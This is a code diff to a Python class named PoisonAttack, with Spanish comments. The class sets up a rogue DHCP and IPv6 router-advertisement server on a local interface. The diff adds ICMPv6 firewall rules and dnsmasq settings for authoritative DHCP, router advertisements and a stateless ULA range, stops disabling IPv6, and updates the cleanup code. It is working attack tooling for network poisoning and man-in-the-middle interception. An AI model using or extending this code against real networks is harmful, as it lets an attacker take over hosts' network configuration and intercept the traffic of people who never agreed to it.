@@ -89,9 +89,9 @@ class PoisonAttack:
             time.sleep(2)
 
             # Desactivar IPv6 para evitar esperas de SLAAC
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
+            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
+            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
+            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
 
             ip = "192.168.10.1"
             subnet_mask = "24"
@@ -108,9 +108,12 @@ class PoisonAttack:
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
+            os.system(f"sudo ip6tables -A INPUT -i {iface} -p icmpv6 -j ACCEPT")
+            os.system(f"sudo ip6tables -A OUTPUT -o {iface} -p icmpv6 -j ACCEPT")
             # ======================================================
 
             # Configuración dnsmasq (DHCP sin DNS)
+        
             config_dhcp = (
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
@@ -120,11 +123,15 @@ class PoisonAttack:
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
                 f"bind-dynamic\n"
+                f"dhcp-authoritative\n"     # <-- acelera la asignación DHCP
+                f"enable-ra\n"              # <-- activa Router Advertisements
+                f"dhcp-range=fd00::,ra-stateless,12h\n"   # <-- rango ULA para SLAAC
                 f"no-resolv\n"
                 f"no-hosts\n"
-                f"port=0\n"          # Sin DNS para evitar conflictos
+                f"port=0\n"
                 f"log-dhcp\n"
             )
+
             with open("dnsmasq_temp.conf", "w") as f:
                 f.write(config_dhcp)
 
@@ -209,6 +216,8 @@ class PoisonAttack:
         os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 67 -j ACCEPT 2>/dev/null")
         os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
         os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --sport 67 -j ACCEPT 2>/dev/null")
+        os.system(f"sudo ip6tables -D INPUT -i {self.interface} -p icmpv6 -j ACCEPT 2>/dev/null")
+        os.system(f"sudo ip6tables -D OUTPUT -o {self.interface} -p icmpv6 -j ACCEPT 2>/dev/null")
         os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
         os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
         # Restaurar servicios detenidos
